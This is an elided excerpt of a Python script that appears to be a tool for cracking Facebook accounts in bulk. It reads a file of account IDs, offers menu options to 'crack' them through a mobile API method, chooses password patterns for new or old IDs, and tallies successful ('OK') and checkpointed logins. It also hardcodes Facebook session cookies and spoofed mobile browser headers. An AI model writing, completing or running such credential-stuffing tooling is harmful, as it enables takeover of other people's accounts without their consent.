...
cookies = {
    'datr': '2yX5ZB5E4uhXtEkX2oTQoLUc',
    'sb': '2yX5ZOiBHv1Pm7IM7x2ZPwJv',
    'locale': 'en_US',
    'vpd': 'v1%3B783x393x2.75',
    'wl_cbv': 'v2%3Bclient_version%3A2321%3Btimestamp%3A1694157862',
    'm_pixel_ratio': '2.75',
    'wd': '393x783',
    'fr': '0UTKDcTVUykZ9IizK.AWX5ZyeAloIUIp_57x9kcB4CY2I.Bk-SXb.mM.AAA.0.0.Bk-sxE.AWW6_JyhXPY',}
...
headers = {
    ...
    # 'cookie': 'datr=2yX5ZB5E4uhXtEkX2oTQoLUc; sb=2yX5ZOiBHv1Pm7IM7x2ZPwJv; locale=en_US; vpd=v1%3B783x393x2.75; wl_cbv=v2%3Bclient_version%3A2321%3Btimestamp%3A1694157862; m_pixel_ratio=2.75; wd=393x783; fr=0UTKDcTVUykZ9IizK.AWX5ZyeAloIUIp_57x9kcB4CY2I.Bk-SXb.mM.AAA.0.0.Bk-sxE.AWW6_JyhXPY',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"22101320G"',
...
def menu():
	#ckx()
	clear()
	print(f"{W}[{G}\033[1;97m1{W}] 𝙲𝚁𝙰𝙲𝙺 𝙵𝙸𝙻𝙴\033[1;97m\033[1;92m ")
	linex()
	me=input(f'\33[1;97m[\33[1;97m?\33[1;97m]\33[1;97m 𝙲𝚑𝚘𝚒𝚌𝚎  :\33[1;92m ')
	if me in ["1", "01"]:
		fil()
	elif me in ["2", "02"]:
		os.system(' POLICE😎 ')
...
class D:
	...
	def plerr(self):
		...
		banner()
		try:
			fileX = input ('\033[1;97m𝚂𝚊𝚟𝚎 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎 𝚢𝚘𝚞 𝚌𝚛𝚎𝚊𝚝𝚎𝚍 : \33[1;92m') 
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(WHITE+'\033[1;92m ids ➸  : \033[1;96m'+str(len(id)))
			for i in range(101):
...
def Settings():
	...
	print(f'\033[1;97m[\33[1;97m1\33[1;97m]\33[1;97m[𝙿𝚛𝚎𝚜𝚜 1 𝚝𝚘 𝚕𝚘𝚐𝚒𝚗 𝚊𝚗𝚍 𝚌𝚛𝚊𝚌𝚔]\33[1;92m')
	print('\x1b[38;5;43m 🐧 Total ids\x1b[38;5;43m',str(len(id)))                                                                 
	hu = input('\33[1;97m[\33[1;97m?\33[1;97m]\33[1;97m𝙲𝚑𝚘𝚒𝚌𝚎 :\x1b[1;92m ')
	if hu in ['0','00']:
		muda=[]
		...
		exit()
	os.system("clear");banner()
	print(f'\033[1;97m[\33[1;97m1\33[1;97m]\33[1;97m 𝙼𝙴𝚃𝙾𝙳𝙴-𝙱-𝙰𝙿𝙸 \33[1;92m ')
	hc = input('\33[1;97m[\33[1;97m?\33[1;97m]\33[1;97m𝙲𝚑𝚘𝚒𝚌𝚎 :\x1b[1;92m ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		methode.append('mobile')
	pwplus=input('\033[1;97m[ 1 ] 𝙽𝙴𝚆 𝙸𝙳 [𝙶𝙾𝙾𝙳]\n[ 2 ] 𝙾𝙻𝙳 𝙸𝙳 [𝚅𝙴𝚁𝚈𝙶𝙾𝙾𝙳]\n\033[1;97m[\33[1;97m?\33[1;97m]\33[1;97m𝙲𝚑𝚘𝚒𝚌𝚎 :\33[1;92m')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def passwrd():
	...
	print(f' \x1b[1;93m\x1b[1;92m√\x1b[1;92m➾OK➾: {h}%s '%(ok))
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{x}[{bo}Vip🦅{x}]{loop}{P}|\x1b[38;5;48m{ok}"),
	sys.stdout.flush()
